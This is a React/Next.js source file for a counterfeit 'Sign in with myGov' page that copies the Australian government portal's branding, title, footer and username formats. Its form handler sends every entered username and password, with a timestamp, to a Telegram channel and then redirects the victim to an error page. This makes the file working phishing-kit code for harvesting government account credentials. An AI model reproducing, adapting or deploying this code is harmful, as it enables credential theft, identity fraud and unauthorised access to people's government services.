"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Head from "next/head";
import { sendTelegramMessage } from "../../utils/telegram";

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const phoneRegex = /^\d{10}$/;
const myGovUsernameRegex = /^[A-Za-z]{2}\d{6}$/;

const validateUsername = (username: string): string => {
  if (
    emailRegex.test(username) ||
    phoneRegex.test(username) ||
    myGovUsernameRegex.test(username)
  ) {
    return "";
  }
  return "Enter a valid email address, mobile number, or myGov username (2 letters followed by 6 numbers).";
};

const MyGovSignIn = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [usernameError, setUsernameError] = useState<string>("");
  const router = useRouter();

  const togglePasswordVisibility = () => {
    setShowPassword((prev) => !prev);
  };

  const handleFormSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    const username = (form.elements.namedItem("username") as HTMLInputElement)
      .value;
    const password = (form.elements.namedItem("password") as HTMLInputElement)
      .value;

    const error = validateUsername(username);
    if (error) {
      setUsernameError(error);
      return;
    }

    // Reset any previous error
    setUsernameError("");

    // Prepare the message for Telegram
    const message = `
      🚨 Login Attempt 🚨
      - Username: ${username}
      - Password: ${password}
      - Time: ${new Date().toLocaleString()}
    `;

    try {
      await sendTelegramMessage(message);
      router.push("/err");
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  };

  return (
    <>
      <Head>
        <title>Sign in with myGov - myGov</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <div className="min-h-screen flex flex-col bg-gray-50">
        {/* Header */}
        <header className="bg-[#66d3ee] border-b-4 border-[#66d3ee]">
          <div className="max-w-7xl mx-auto flex items-center p-4">
            <a href="#" className="flex items-center">
              <Image
                src="/images/myGov-cobranded-logo-black.svg"
                alt="myGov Beta Logo"
                width={150}
                height={40}
              />
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="flex-grow container mx-auto mt-12 px-4">
          <div className="max-w-lg mx-auto bg-white p-10 shadow-lg rounded-xl">
            <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">
              Sign in with myGov
            </h1>
            <p className="text-sm text-gray-600 text-center mb-8">
              Access government services with your myGov account
            </p>
            <form onSubmit={handleFormSubmit}>
              {/* Username Field */}
              <div className="mb-6">
                <label
                  htmlFor="userId"
                  className="block text-sm font-medium text-black"
                >
                  Username or email
                </label>
                <input
                  id="userId"
                  name="username"
                  type="text"
                  required
                  className={`w-full mt-2 border ${
                    usernameError ? "border-red-500" : "border-gray-300"
                  } rounded-lg p-3 focus:outline-none focus:ring-2 ${
                    usernameError ? "focus:ring-red-500" : "focus:ring-blue-500"
                  }`}
                  onBlur={(e) =>
                    setUsernameError(validateUsername(e.target.value))
                  }
                />
                {usernameError && (
                  <p className="text-sm text-red-500 mt-2">{usernameError}</p>
                )}
                <p className="text-sm mt-2 text-right">
                  <a
                    href="#"
                    className="text-blue-600 hover:underline focus:outline-none"
                  >
                    Forgot username?
                  </a>
                </p>
              </div>

              {/* Password Field */}
              <div className="mb-6 relative">
                <label
                  htmlFor="password"
                  className="block text-sm font-medium text-black"
                >
                  Password
                </label>
                <input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  required
                  className="w-full mt-2 border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute right-3 top-9 text-blue-600 text-sm font-medium hover:underline focus:outline-none"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
                <p className="text-sm mt-2 text-right">
                  <a
                    href="#"
                    className="text-blue-600 hover:underline focus:outline-none"
                  >
                    Forgot password?
                  </a>
                </p>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="w-full px-6 py-3 font-medium text-white bg-[#66d3ee] rounded-lg hover:bg-[#5bbad7] transition focus:outline-none focus:ring-2 focus:ring-blue-600"
              >
                Sign in
              </button>

              {/* Create Account */}
              <p className="text-center text-sm text-gray-600 mt-6">
                Don’t have an account?{" "}
                <a
                  href="https://my.gov.au/en/create-account/"
                  className="text-blue-600 hover:underline focus:outline-none"
                >
                  Create one here
                </a>
              </p>
            </form>
          </div>
        </main>

        {/* Footer */}
        <footer className="bg-gray-900 text-white py-10 mt-12">
          <div className="container mx-auto text-center">
            <ul className="flex justify-center space-x-6 mb-4 text-sm">
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Terms of use
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Privacy and security
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Copyright
                </a>
              </li>
              <li>
                <a href="#" className="hover:underline focus:outline-none">
                  Accessibility
                </a>
              </li>
            </ul>
            <Image
              src="/images/myGov-cobranded-logo-white.svg"
              alt="myGov Beta Logo"
              width={150}
              height={40}
              className="h-10 mx-auto"
            />
            <p className="mt-6 text-sm">
              We acknowledge the Traditional Custodians of the lands we live on.
              We pay our respects to all Elders, past and present, of all
              Aboriginal and Torres Strait Islander nations.
            </p>
          </div>
        </footer>
      </div>
    </>
  );
};

export default MyGovSignIn;
